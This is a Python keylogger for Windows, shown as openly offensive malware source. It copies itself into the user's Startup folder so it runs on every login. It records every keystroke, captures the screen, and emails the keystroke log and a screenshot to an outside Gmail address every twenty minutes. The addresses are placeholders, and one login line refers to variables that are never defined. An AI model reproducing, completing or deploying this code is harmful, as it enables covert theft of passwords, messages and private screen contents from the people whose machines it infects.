#!/usr/bin/env python3
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from PIL import ImageGrab
import pynput.keyboard
import threading
import smtplib 
import sys
import os 


class Keylogger:

    def __init__(self):
        self.log = "Keylogger started!" 

    def autorun(self):
        file = sys.argv[0]
        file_name = os.path.basename(file)
        usr_path = os.path.expanduser("~")

        if not os.path.exists(f"{usr_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{file_name}"):
            os.system(f'copy "{file}" "{usr_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')

    def process_key_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            if key == key.space:
                self.log += " "
            elif key == key.enter:
                self.log += "\n"
            elif key == key.tab:
                self.log += "    "
            elif key == key.backspace:
                self.log += ""
            else:
                self.log += " " + str(key) + " " 

    def send_log(self): 
        self.send_email()
        self.log = ""

        timer = threading.Timer(1200, self.send_log)
        timer.start() 

    def send_email(self):
        self.screenshot()
        me             = 'example1@gmail.com'
        you            = 'example2@gmail.com'
        img_data       = open("screen.png", 'rb').read()
        msg            = MIMEMultipart()
        msg['Subject'] = 'subject'
        msg['From']    = me
        msg['To']      = you

        text    = MIMEText(self.log)
        image   = MIMEImage(img_data, name = os.path.basename("screen.png"))
        msg.attach(text)
        msg.attach(image)

        s = smtplib.SMTP("smtp.gmail.com", 587)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(email, passwd)
        s.sendmail(me, you, msg.as_string())
        s.quit()
        
    def screenshot(self):
        screen = ImageGrab.grab()
        screen.save("screen.png") 

    def start(self):
        with pynput.keyboard.Listener(on_press = self.process_key_press) as listener:
            self.send_log() 
            listener.join() 

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.autorun() 
    keylogger.start() 
